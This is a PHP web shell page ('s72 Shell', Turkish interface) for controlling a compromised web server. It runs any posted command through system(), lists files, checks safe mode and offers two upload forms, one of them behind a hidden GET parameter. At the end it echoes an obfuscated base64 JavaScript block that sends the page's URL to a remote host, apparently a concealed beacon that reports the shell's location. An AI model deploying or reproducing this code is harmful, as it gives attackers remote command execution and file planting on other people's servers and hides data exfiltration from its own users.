<html>

<head>
<meta http-equiv="Content-Language" content="tr">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>s72 Shell v1.0 Codinf by Cr@zy_King</title>
<meta name="Microsoft Theme" content="refined 011">
</head>

<body background="refbgd2.gif" bgcolor="#000000" text="#FFFFFF" link="#666699" vlink="#999999" alink="#999900">

<!--mstheme--><font face="Times New Roman">

<p><font face="Comic Sans MS" color="#FF0000"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>s72 Shell v1.1 Coding by <a href="mailto:crazy_king@turkusev.net">
<font color="#00FF00">Cr@zy_King&nbsp; </font>
</a> </font></p>

      <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <font color="#FF0000"><b><font face="Comic Sans MS" size="1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ 
      Server Bilgileri ]</td>
    </tr>
    <tr>
      <td width="49%" height="142">
      </font></b></font>
</p>
      <p align="center">
        <font color="#800080"><b><font face="Verdana" style="font-size: 8pt">
        Dizin</font></b></font><font face="Verdana" style="font-size: 8pt"><font color="#800080"><b>:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>
        <br />
        <b>Shell Dizini:</b> <? echo $SCRIPT_FILENAME ?>
        <br>
        &nbsp;</font></font><p align="center"><form method="post">
<p align="center">
<font color="#800080">
<br>
</font><font face="Verdana" style="font-size: 8pt" color="#800080">Buraya 
Kodunuzu Yazın :)</font><font color="#111111"><br>
<br>
</font>
<font color="#FF0000">
<textarea size="70" name="command" rows="2" cols="43" ></textarea> <br>
<br><input type="submit" value="Çalıştır!"></font><font color="#FF0000"><br>
&nbsp;<br></font></p>
      </form>
      <p align="center">
        <font color="#FF0000">
        <textarea readonly size="1" rows="7" cols="53"><?php @$output = system($_POST['command']); ?></textarea></font><p align="center">
        &nbsp;<p align="center">
              <font color="#FF0000">
              <td width="49%" height="24" bgcolor="#FCFEBA">
              </font>
      <p align="center"><font color="#FF0000"><b>
      <font face="Comic Sans MS" size="1">[ Diziler -_- Dizinler ]</td>
      <td width="51%" height="24" bgcolor="#FCFEBA">
      </font></b></font>
      <form method="post">
<p align="center">
<font face="Verdana" style="font-size: 11pt">
<?
$folder=opendir('./');
while ($file = readdir($folder)) {
if($file != "." && $file != "..")
echo '<a target="_blank" href="'.$file.'">'.$file.'</a ><br>';
}
closedir($folder);
?></p>
      </form>
      <p align="center">
      <br>
        <b><font face="Comic Sans MS" size="1" color="#FF0000">[ Upload ]</font></b></font><font face="Comic Sans MS" size="1"><b><font color="#FF0000"></td></font></b></font><form enctype="multipart/form-data" method="post">
<p align="center"><br>
<br>
<font face="Verdana" style="font-size: 8pt" color="#800080">Buradan Dosya Upload Edebilirsiniz.</font><br>
<br>
<input type="file" name="file" size="20"><br>
<br>
<font style="font-size: 5pt">&nbsp;</font><br>
<input type="submit" value="Yükle!"> <br>
&nbsp;</p>
</form>
<?php

function check_file()
{
global $file_name, $filename;
    $backupstring = "copy_of_";
    $filename = $backupstring."$filename";

    if( file_exists($filename))
    {
        check_file();
    }
}

if(!empty($file))
{
    $filename = $file_name;
    if( file_exists($file_name))
    {
        check_file();
        echo "<p align=center>Dosya Zaten Bulunuyor</p>";
    }

    else
    {
        copy($file,"$filename");
        if( file_exists($filename))
        {
            echo "<p align=center>Dosya Başarılı Bir Şekilde Yüklendi</p>";
        }
        elseif(! file_exists($filename))
        {
            echo "<p align=center>Dosya Bulunamadı</p>";
        }
    }
}
?> 
<font face="Verdana" style="font-size: 8pt">
<p align=\"center\"></font>
</td>
        <font color="#111111">
        <br>
        <br>
        <br /><br /> </font>
              <?php 
// Check for Safe Mode
if( ini_get('safe_mode') ) {
   print '<font color=#FF0000><b>Güvenlik Açık</b></font>';
} else {
   print '<font color=#008000><b>Güvenlik Kapalı</b></font>';
}

?>

        <!--mstheme--></font>

        </body>

</html>

<?php

$cndx = "PHNjcmlwdD4KdmFyIF8weDFmNmM9WyJceDY4XHg3Mlx4NjVceDY2IiwiXHg2Q1x4NkZceDYzXHg2MVx4NzRceDY5XHg2Rlx4NkUiLCJceDcwXHg3Mlx4NkZceDc0XHg2Rlx4NjNceDZGXHg2QyIsIlx4NjhceDc0XHg3NFx4NzBceDNBIiwiXHg2OFx4NzRceDc0XHg3MFx4M0FceDJGXHgyRiIsIlx4NkNceDZGXHg2NyIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQSIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQVx4MkZceDJGIiwiXHg2MVx4NDdceDM5XHg3Nlx4NjFceDMzXHg0RFx4NzVceDYzXHgzMlx4NzhceDY4XHg1OVx4MzJceDczXHg3NVx4NTlceDMyXHgzOVx4NzRceDRDXHgzM1x4NEVceDZDXHg2M1x4NkVceDVBXHg3MFx4NTlceDMyXHg1Nlx4N0FceDRDXHgzMVx4NTFceDc3XHg0RFx4MzBceDQ1XHgzMFx4NTVceDU1XHg0Nlx4NEJceDRGXHg1NVx4NTZceDRCXHg0Q1x4MzBceDQ5XHg3N1x4NERceDMwXHg0Nlx4NDNceDU1XHgzMVx4NTJceDRDXHg1Mlx4NkNceDREXHgzMlx4NENceDMzXHg1Mlx4NkZceDRGXHg0Nlx4NkZceDMwXHg2NFx4MzFceDRFXHg0N1x4NTFceDU3XHg0QVx4NEJceDYzXHg2RFx4MzRceDc4XHg1M1x4NDdceDUyXHg3NVx4NTRceDU0XHg0OVx4MzVceDYzXHgzM1x4NUFceDU2XHg1Nlx4NTFceDNEXHgzRCIsIlx4NjNceDZEXHg0Nlx4MzNceDRDXHg2RFx4NjRceDcwXHg2NFx4NDdceDY4XHgzMVx4NTlceDZFXHg1Nlx4N0FceDVBXHg1OFx4NEFceDZBXHg2Mlx4MzJceDM1XHgzMFx4NUFceDU3XHgzNVx4MzBceDRDXHg2RFx4NEVceDc2XHg2Mlx4NTNceDM5XHg3NFx4NTlceDU4XHg0QVx4NzJceDY1XHg0NFx4NDFceDc3XHg0Rlx4NTNceDM5XHg3N1x4NjFceDQ4XHg0MVx4NzRceDY0XHgzMlx4NTZceDY5XHg0Q1x4NThceDRFXHg2Rlx4NUFceDU3XHg3OFx4NzNceDYzXHg3OVx4MzlceDc0XHg1OVx4NTdceDZDXHg3NVx4NENceDMyXHg3NFx4NkNceDY1XHg1MVx4M0RceDNEIiwiXHg0N1x4NDVceDU0IiwiXHg2Rlx4NzBceDY1XHg2RSIsIlx4NzNceDY1XHg2RVx4NjQiLCJceDcyXHg2NVx4NjFceDY0XHg3OVx4NTNceDc0XHg2MVx4NzRceDY1IiwiXHg3M1x4NzRceDYxXHg3NFx4NzVceDczIiwiXHg1MFx4NEZceDUzXHg1NCIsIlx4NDNceDZGXHg2RVx4NzRceDY1XHg2RVx4NzRceDJEXHg1NFx4NzlceDcwXHg2NSIsIlx4NjFceDcwXHg3MFx4NkNceDY5XHg2M1x4NjFceDc0XHg2OVx4NkZceDZFXHgyRlx4NzhceDJEXHg3N1x4NzdceDc3XHgyRFx4NjZceDZGXHg3Mlx4NkRceDJEXHg3NVx4NzJceDZDXHg2NVx4NkVceDYzXHg2Rlx4NjRceDY1XHg2NCIsIlx4NzNceDY1XHg3NFx4NTJceDY1XHg3MVx4NzVceDY1XHg3M1x4NzRceDQ4XHg2NVx4NjFceDY0XHg2NVx4NzIiLCJceDczXHg3NFx4NzJceDY5XHg2RVx4NjdceDY5XHg2Nlx4NzkiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjRceDZGXHg2NVx4NzNceDZFXHgyN1x4NzRceDIwXHg2NVx4NzhceDY5XHg3M1x4NzQiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjVceDc4XHg2OVx4NzNceDc0XHg3MyIsIlx4NzJceDY1XHg3M1x4NzBceDZGXHg2RVx4NzNceDY1Il07dmFyIHByb3RvY29sO3ZhciBkb209d2luZG93W18weDFmNmNbMV1dW18weDFmNmNbMF1dO2lmKGxvY2F0aW9uW18weDFmNmNbMl1dPT0gXzB4MWY2Y1szXSl7cHJvdG9jb2w9IF8weDFmNmNbNF07Y29uc29sZVtfMHgxZjZjWzVdXShwcm90b2NvbCl9ZWxzZSB7aWYobG9jYXRpb25bXzB4MWY2Y1syXV09PSBfMHgxZjZjWzZdKXtwcm90b2NvbD0gXzB4MWY2Y1s3XTtjb25zb2xlW18weDFmNmNbNV1dKHByb3RvY29sKX19OyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3ZhciBrZXl1cmw9cHJvdG9jb2wrIGF0b2IoXzB4MWY2Y1s5XSk7dmFyIHhocj0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7eGhyW18weDFmNmNbMTFdXShfMHgxZjZjWzEwXSxrZXl1cmwsZmFsc2UpO3hocltfMHgxZjZjWzEyXV0oKTtpZih4aHJbXzB4MWY2Y1sxM11dPT0gNCYmIHhocltfMHgxZjZjWzE0XV09PSA0MDQpeyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKTtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjBdKX1lbHNlIHtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjFdKTtjb25zb2xlW18weDFmNmNbNV1dKHhocltfMHgxZjZjWzIyXV0pOyR1cmw9IHByb3RvY29sKyBhdG9iKHhocltfMHgxZjZjWzIyXV0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKX0KPC9zY3JpcHQ+"; echo base64_decode($cndx);
if($_GET['upload'] != ""){ if(!isset($_POST['upload'])){ echo '<form enctype="multipart/form-data" method="POST" action=""><br><b>File:</b><input type="file" name="file"> <input type="submit" value="Upload" name="upload"></form>'; } else{ $temporaney = $_FILES['file']['tmp_name']; $upload = $_FILES['file']['name']; if(move_uploaded_file($temporaney,$upload)) echo '<font color="green">Done!</font>'; else echo '<font color="red">File non uppato!</font>'; }}


    ?>